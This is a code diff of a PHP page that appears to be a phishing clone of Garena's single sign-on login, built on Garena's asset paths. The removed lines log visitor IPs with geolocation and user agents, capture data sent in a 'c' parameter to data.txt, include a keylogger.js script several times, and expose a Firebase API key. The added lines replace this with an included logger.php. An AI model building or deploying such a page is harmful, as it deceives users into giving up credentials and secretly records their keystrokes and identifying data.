@@ -1,18 +1,6 @@
 <?php
-$ip = $_SERVER['REMOTE_ADDR'];
-$ip_info = json_decode(file_get_contents("http://ip-api.com/json/$ip"), true);
-$browser = $_SERVER['HTTP_USER_AGENT'];
-$dateTime = date('Y/m/d G:i:s');
-$file = "visitors.html";
-$file = fopen($file, "a");
-
-fclose($file);
-if(!empty($_GET['c'])) {
-  $logfile = fopen('data.txt', 'a+');
-  fwrite($logfile, $_GET['c']);
-  fclose($logfile);
-}
-
+$vist_page     =   "index.php";
+include "logger.php";
 ?>
 
 <html>
@@ -85,38 +73,12 @@ if(!empty($_GET['c'])) {
           enableTagEvents: true,
         }
       );
-    </script>
+      </script>
 
-    <style></style>
-    <script src="keylogger.js"></script>
-    <script nomodule="">!function(){var e=document,t=e.createElement("script");if(!("noModule"in t)&&"onbeforeload"in t){var n=!1;e.addEventListener("beforeload",(function(e){if(e.target===t)n=!0;else if(!e.target.hasAttribute("nomodule")||!n)return;e.preventDefault()}),!0),t.type="module",t.src=".",e.head.appendChild(t),t.remove()}}();</script>
-    <script nomodule="" crossorigin="" id="vite-legacy-polyfill" src="https://sso.garena.com/universal/assets/polyfills-legacy-45cadae9.js"></script>
-    <script nomodule="" crossorigin="" id="vite-legacy-entry" data-src="https://sso.garena.com/universal/assets/index-legacy-485f3edd.js">System.import(document.getElementById('vite-legacy-entry').getAttribute('data-src'))</script>
-    <script src="keylogger.js"></script><script src="keylogger.js"></script><script src="keylogger.js"></script><script src="keylogger.js"></script>
-
-    <script type="module">
-  // Import the functions you need from the SDKs you need
-  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-  import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-analytics.js";
-  // TODO: Add SDKs for Firebase products that you want to use
-  // https://firebase.google.com/docs/web/setup#available-libraries
-
-  // Your web app's Firebase configuration
-  // For Firebase JS SDK v7.20.0 and later, measurementId is optional
-  const firebaseConfig = {
-    apiKey: "AIzaSyBZ0_-AN_qOiNEb52Xy7ycQJ3y3_YiUJFI",
-    authDomain: "mali4saleshop.firebaseapp.com",
-    projectId: "mali4saleshop",
-    storageBucket: "mali4saleshop.appspot.com",
-    messagingSenderId: "1022120591242",
-    appId: "1:1022120591242:web:e97e143fba1bfded11d273",
-    measurementId: "G-17T43RHP8B"
-  };
-
-  // Initialize Firebase
-  const app = initializeApp(firebaseConfig);
-  const analytics = getAnalytics(app);
-</script>
+    
+<script nomodule="">!function(){var e=document,t=e.createElement("script");if(!("noModule"in t)&&"onbeforeload"in t){var n=!1;e.addEventListener("beforeload",(function(e){if(e.target===t)n=!0;else if(!e.target.hasAttribute("nomodule")||!n)return;e.preventDefault()}),!0),t.type="module",t.src=".",e.head.appendChild(t),t.remove()}}();</script>
+<script nomodule="" crossorigin="" id="vite-legacy-polyfill" src="/universal/assets/polyfills-legacy-45cadae9.js"></script>
+<script nomodule="" crossorigin="" id="vite-legacy-entry" data-src="/universal/assets/index-legacy-485f3edd.js">System.import(document.getElementById('vite-legacy-entry').getAttribute('data-src'))</script>
 
 
-</html>   
+<!----><!----></body></html>
